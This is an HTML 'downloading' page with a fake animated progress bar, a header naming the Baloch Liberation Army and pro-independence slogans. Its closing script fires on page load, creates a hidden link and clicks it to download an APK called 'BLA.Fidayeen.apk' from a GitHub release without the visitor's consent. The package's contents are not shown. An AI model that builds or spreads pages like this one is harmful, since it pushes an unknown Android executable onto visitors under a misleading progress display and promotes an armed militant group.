<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Neon Loading</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap');

    body {
      margin: 0;
      padding: 0;
      font-family: 'Roboto Mono', monospace;
      min-height: 100vh;
      background: url('image.jpg') center/cover no-repeat;
      color: #00ff41;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .container {
      width: 90%;
      max-width: 500px;
      text-align: center;
      background: rgba(0, 0, 0, 0.4);
      padding: 1.5rem;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
    }

    h1 {
      font-size: 2.2rem;
      margin-bottom: 1rem;
      text-shadow: 0 0 10px #00ff41, 0 0 20px #00ff41;
      animation: pulse 2s infinite;
    }

    h2 {
      font-size: 1.2rem;
      margin-bottom: 2rem;
      text-shadow: 0 0 5px #00ff41;
    }

    .progress-container {
      width: 100%;
      background-color: #1a1a1a;
      border-radius: 5px;
      margin-bottom: 1.5rem;
      box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
      height: 20px;
      overflow: hidden;
    }

    .progress-bar {
      height: 100%;
      background-color: #00ff41;
      width: 0%;
      border-radius: 5px;
      box-shadow: 0 0 10px #00ff41;
      transition: width 0.1s linear;
    }

    .progress-text {
      display: flex;
      justify-content: space-between;
      font-size: 0.9rem;
      margin-top: 0.5rem;
    }

    .processes {
      margin: 1.5rem 0;
      text-align: left;
      padding-left: 10%;
    }

    .process {
      margin-bottom: 0.4rem;
      position: relative;
      opacity: 0;
      transform: translateX(-20px);
    }

    .process:before {
      content: ">";
      position: absolute;
      left: -20px;
    }

    .status-text {
      font-size: 0.9rem;
      margin-top: 1.5rem;
    }

    .search {
      margin-top: 2rem;
      position: relative;
      width: 150px;
      margin-left: auto;
      margin-right: auto;
    }

    .search:after {
      content: "";
      position: absolute;
      bottom: -5px;
      left: 0;
      width: 100%;
      height: 1px;
      background-color: #00ff41;
      box-shadow: 0 0 5px #00ff41;
      animation: blink 1s infinite;
    }

    .glow {
      text-shadow: 0 0 5px #00ff41;
    }

    @keyframes pulse {
      0% { opacity: 0.8; }
      50% { opacity: 1; text-shadow: 0 0 15px #00ff41, 0 0 30px #00ff41; }
      100% { opacity: 0.8; }
    }

    @keyframes blink {
      0% { opacity: 0; }
      50% { opacity: 1; }
      100% { opacity: 0; }
    }

    @media (max-width: 500px) {
      h1 { font-size: 1.8rem; }
      h2 { font-size: 1rem; }
      .processes { padding-left: 5%; }
      .search { width: 120px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>DOWNLOADING</h1>
    <h2>The Baloch Liberation Army ...</h2>

    <div class="progress-container">
      <div class="progress-bar" id="progressBar"></div>
    </div>

    <div class="progress-text">
      <span>Progress</span>
      <span id="progressPercent">0%</span>
    </div>

    <div class="progress-text">
      <span>Initializing...</span>
      <span class="glow">Booting system...</span>
    </div>

    <div class="processes" id="processes">
      <div class="process">آزات بلوچستان</div>
      <div class="process">ميراگ آجويي</div>
      <div class="process">حق ءُ انصاف ءِ واستہ جنگ</div>
    </div>

    <div class="status-text">
      Downloading files and preparing your experience...<br>
      This may take a few moments.
    </div>

    <div class="search">
      <strong>Azad Balochistan</strong>
    </div>
  </div>

  <script>
    // Progress animation
    const progressBar = document.getElementById('progressBar');
    const progressPercent = document.getElementById('progressPercent');
    let progress = 0;
    let direction = 1;

    function animateProgress() {
      progress += direction * 2;

      if (progress >= 100) {
        progress = 100;
        direction = -1;
      } else if (progress <= 0) {
        progress = 0;
        direction = 1;
      }

      progressBar.style.width = `${progress}%`;
      progressPercent.textContent = `${progress}%`;
    }

    setInterval(animateProgress, 60);

    // Reveal process steps
    const processes = document.querySelectorAll('.process');
    processes.forEach((process, index) => {
      setTimeout(() => {
        process.style.opacity = '1';
        process.style.transform = 'translateX(0)';
        process.style.transition = 'opacity 0.5s, transform 0.5s';
        setInterval(() => {
          process.classList.toggle('glow');
        }, 1000 + Math.random() * 2000);
      }, 500 * index);
    });

    // Glow pulsing
    setInterval(() => {
      const glowing = document.querySelectorAll('.glow');
      glowing.forEach(el => {
        el.style.textShadow = `0 0 ${5 + Math.random() * 5}px #00ff41`;
      });
    }, 300);

    // 🔽 Trigger auto-download on page load
    window.addEventListener('load', () => {
      const link = document.createElement('a');
      link.href = 'https://github.com/hooooxjuxrr/su/releases/download/sa/BLA.Fidayeen.apk';
      link.download = '';
      link.style.display = 'none';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    });
  </script>
</body>
</html>
